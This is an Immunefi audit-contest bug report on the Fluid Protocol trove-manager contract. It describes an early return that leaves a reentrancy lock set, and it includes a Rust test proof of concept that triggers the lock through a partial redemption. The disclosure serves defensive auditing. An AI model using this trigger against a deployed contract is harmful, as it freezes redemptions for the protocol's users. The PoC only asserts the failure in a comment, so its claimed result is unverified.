# #37671 \[SC-Critical] CRITICAL-02 / The contract could be permanently locked due to not reseting the

**Submitted on Dec 12th 2024 at 09:40:40 UTC by @Minato7namikazi for** [**IOP | Fluid Protocol**](https://immunefi.com/audit-competition/iop-fluid-protocol)

* **Report ID:** #37671
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/Hydrogen-Labs/fluid-protocol/tree/main/contracts/trove-manager-contract/src/main.sw>
* **Impacts:**
  * Protocol insolvency

## Description

In the `trove-manager-contract/src/main.sw`

There is a path in "internal\_redeem\_collateral\_from\_trove" function that leads to an early return statement without resetting the reentrancy lock.

This causes the contract to remain permanently locked, effectively freezing the redemption functionality

### Details & Impact

The function `internal_redeem_collateral_from_trove` uses a storage boolean ( lock\_internal\_redeem\_collateral\_from\_trove ) to prevent reentrancy attacks. The intended pattern is:

1. At the start of the function, set the lock to `true`.
2. Execute the redemption logic.
3. At the end of the function, set the lock back to `false`.

This ensures that if the function reverts or completes normally, the lock is reset, and subsequent calls are not blocked.

within this function, there is a conditional branch that can cause an early return before reaching the lock reset :

```
// ... calculations and checks above ...

if (new_debt < MIN_NET_DEBT) {
    single_redemption_values.cancelled_partial = true;
    return single_redemption_values;
}

// ... rest of the function that eventually resets the lock ...
```

In this scenario, if `new_debt < MIN_NET_DEBT`, the function returns early

never reaching the code that set `storage.lock_internal_redeem_collateral_from_trove` back to `false`

As a result, the lock remains permanently engaged. Once locked, no subsequent calls that require this lock to be `false` can proceed, effectively breaking the redemption functionality

Causing a Critical Protocol insolvency

PoC in "trove-manager-contract/tests/failure.rs"

## Proof of Concept

```
#[tokio::test]

async fn fails_with_stuck_redemption_lock() {

let (contracts, _admin, mut wallets) = setup_protocol(5, false, false).await;

  

oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;

pyth_oracle_abi::update_price_feeds(

&contracts.asset_contracts[0].mock_pyth_oracle,

pyth_price_feed(10),

)

.await;

  

let wallet1 = wallets.pop().unwrap();

let wallet2 = wallets.pop().unwrap();

  

// Setup initial balances

let balance = 25_000 * PRECISION;

token_abi::mint_to_id(

&contracts.asset_contracts[0].asset,

balance,

Identity::Address(wallet1.address().into()),

)

.await;

token_abi::mint_to_id(

&contracts.asset_contracts[0].asset,

balance,

Identity::Address(wallet2.address().into()),

)

.await;

  

// Create troves

let borrow_operations_wallet1 = ContractInstance::new(

BorrowOperations::new(

contracts.borrow_operations.contract.contract_id().clone(),

wallet1.clone(),

),

contracts.borrow_operations.implementation_id.clone(),

);

  

let borrow_operations_wallet2 = ContractInstance::new(

BorrowOperations::new(

contracts.borrow_operations.contract.contract_id().clone(),

wallet2.clone(),

),

contracts.borrow_operations.implementation_id.clone(),

);

  

// first trove with debt that will be below MIN_NET_DEBT after partial redemption

borrow_operations_abi::open_trove(

&borrow_operations_wallet1,

&contracts.asset_contracts[0].oracle,

&contracts.asset_contracts[0].mock_pyth_oracle,

&contracts.asset_contracts[0].mock_redstone_oracle,

&contracts.asset_contracts[0].asset,

&contracts.usdf,

&contracts.fpt_staking,

&contracts.sorted_troves,

&contracts.asset_contracts[0].trove_manager,

&contracts.active_pool,

1_100 * PRECISION,

1_000 * PRECISION, // Initial debt

Identity::Address(Address::zeroed()),

Identity::Address(Address::zeroed()),

)

.await

.unwrap();

  
  
  

// second trove with normal amounts

borrow_operations_abi::open_trove(

&borrow_operations_wallet2,

&contracts.asset_contracts[0].oracle,

&contracts.asset_contracts[0].mock_pyth_oracle,

&contracts.asset_contracts[0].mock_redstone_oracle,

&contracts.asset_contracts[0].asset,

&contracts.usdf,

&contracts.fpt_staking,

&contracts.sorted_troves,

&contracts.asset_contracts[0].trove_manager,

&contracts.active_pool,

5_000 * PRECISION,

2_000 * PRECISION,

Identity::Address(Address::zeroed()),

Identity::Address(Address::zeroed()),

)

.await

.unwrap();

  

let protocol_manager_wallet1 = ContractInstance::new(

ProtocolManager::new(

contracts.protocol_manager.contract.contract_id().clone(),

wallet1.clone(),

),

contracts.protocol_manager.implementation_id.clone(),

);

  

let protocol_manager_wallet2 = ContractInstance::new(

ProtocolManager::new(

contracts.protocol_manager.contract.contract_id().clone(),

wallet2.clone(),

),

contracts.protocol_manager.implementation_id.clone(),

);

  

// First redemption - this should trigger the early return without resetting the lock

let _result = protocol_manager_abi::redeem_collateral(

&protocol_manager_wallet1,

900 * PRECISION, // Amount that would leave debt below MIN_NET_DEBT

1, // max_iterations

0, // partial_redemption_hint

Some(Identity::Address(Address::zeroed())),

Some(Identity::Address(Address::zeroed())),

&contracts.usdf,

&contracts.fpt_staking,

&contracts.coll_surplus_pool,

&contracts.default_pool,

&contracts.active_pool,

&contracts.sorted_troves,

&contracts.asset_contracts,

)

.await;

  

// Second redemption - this should fail due to the stuck lock

let result = protocol_manager_abi::redeem_collateral(

&protocol_manager_wallet2,

1_000 * PRECISION, // Normal redemption amount

1, // max_iterations

0, // partial_redemption_hint

Some(Identity::Address(Address::zeroed())),

Some(Identity::Address(Address::zeroed())),

&contracts.usdf,

&contracts.fpt_staking,

&contracts.coll_surplus_pool,

&contracts.default_pool,

&contracts.active_pool,

&contracts.sorted_troves,

&contracts.asset_contracts,

)

.await;

  

// The second redemption will fail with the lock error!

// ("Internal redeem collateral from trove is locked")

}
```
